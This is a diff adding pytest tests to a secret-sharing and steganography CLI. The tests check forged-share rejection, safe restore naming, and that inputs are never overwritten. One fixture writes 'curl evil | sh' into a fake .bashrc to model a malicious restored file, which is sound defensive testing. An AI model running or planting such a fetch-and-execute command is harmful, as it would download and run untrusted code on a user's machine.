@@ -3,13 +3,14 @@
 from __future__ import annotations
 
 import argparse
+import os
 import sys
 
 import numpy as np
 import pytest
 from PIL import Image
 
-from shardpix import cli, stego
+from shardpix import cli, shamir, stego
 from shardpix.images import load_image
 
 
@@ -259,6 +260,20 @@ class TestSplitCombine:
         assert run("combine", shares) == 1
         assert "need 3 shares" in capsys.readouterr().err
 
+    def test_a_larger_forged_set_is_refused(self, tmp_path, capsys):
+        assert run("split", "-t", "genuine", "-k", "3", "-n", "5") == 0
+        honest = capsys.readouterr().out.splitlines()
+        group = shamir.Share.from_text(honest[0]).group_id
+        forged = shamir.split(b"forged!", 3, 6, group_id=group)
+        a, b = tmp_path / "honest.txt", tmp_path / "mallory.txt"
+        a.write_text("\n".join(honest) + "\n")
+        b.write_text("".join(s.to_text() + "\n" for s in forged))
+        assert run("combine", a, b) == 1
+        captured = capsys.readouterr()
+        assert captured.out == ""
+        assert "2 different secrets" in captured.err
+        assert f"{a}:1" in captured.err and f"{b}:6" in captured.err
+
     def test_threshold_larger_than_shares(self, capsys):
         assert run("split", "-t", "secret", "-k", "4", "-n", "3") == 1
         assert "threshold" in capsys.readouterr().err
@@ -321,6 +336,28 @@ class TestVaultCommands:
         assert exc.value.code == 2
         assert "not a path" in capsys.readouterr().err
         assert not (tmp_path / "escaped.spx").exists()
+
+    def test_restored_name_never_replaces_a_file(
+        self, tmp_path, covers, passphrase_file, capsys, monkeypatch
+    ):
+        secret = tmp_path / ".bashrc"
+        secret.write_text("curl evil | sh")
+        out = tmp_path / "sealed"
+        seal = ("seal", secret, *covers[:2], "-k", "2", "-d", out)
+        assert run(*seal, "--passphrase-file", passphrase_file) == 0
+        home = tmp_path / "home"
+        home.mkdir()
+        monkeypatch.chdir(home)
+        (home / "bashrc").write_text("mine")
+        images = (out / "photo0.png", out / "photo1.png")
+        unseal = ("unseal", out / ".bashrc.spx", *images, "--passphrase-file", passphrase_file)
+        capsys.readouterr()
+        assert run(*unseal, "--force") == 1
+        assert "-o" in capsys.readouterr().err
+        assert (home / "bashrc").read_text() == "mine"
+        assert not (home / ".bashrc").exists()
+        assert run(*unseal, "-o", "bashrc", "--force") == 0
+        assert (home / "bashrc").read_text() == "curl evil | sh"
 
     def test_unseal_failure_reports_each_image(self, tmp_path, covers, passphrase_file, capsys):
         secret = tmp_path / "s.txt"
@@ -439,6 +476,30 @@ class TestCleanErrors:
         shares.write_text(capsys.readouterr().out)
         assert run("combine", shares, "-o", shares, "--force") == 1
         assert shares.read_text().startswith("spx1-")
+
+    def test_output_differing_only_in_case_is_an_input(self, tmp_path):
+        image = tmp_path / "c0.png"
+        image.write_bytes(b"share")
+        with pytest.raises(cli.ShardpixError, match="also an input"):
+            cli.check_output(tmp_path / "C0.PNG", force=True, inputs=(image,))
+
+    def test_hard_link_to_an_input_is_an_input(self, tmp_path):
+        image, link = tmp_path / "c0.png", tmp_path / "other.png"
+        image.write_bytes(b"share")
+        os.link(image, link)
+        with pytest.raises(cli.ShardpixError, match="also an input"):
+            cli.check_output(link, force=True, inputs=(image,))
+
+    def test_payload_and_passphrase_files_are_inputs(self, cover_png, tmp_path):
+        # embed writes .png only, so give the inputs that suffix to reach the check.
+        payload, phrase = tmp_path / "payload.png", tmp_path / "phrase.png"
+        payload.write_bytes(b"data")
+        phrase.write_text("correct horse battery staple")
+        for target in (payload, phrase):
+            before = target.read_bytes()
+            argv = ("embed", cover_png, "-o", target, "-i", payload, "-f")
+            assert run(*argv, "--passphrase-file", phrase) == 1
+            assert target.read_bytes() == before
 
     def test_split_into_a_file_path(self, tmp_path, capsys):
         file = tmp_path / "file"
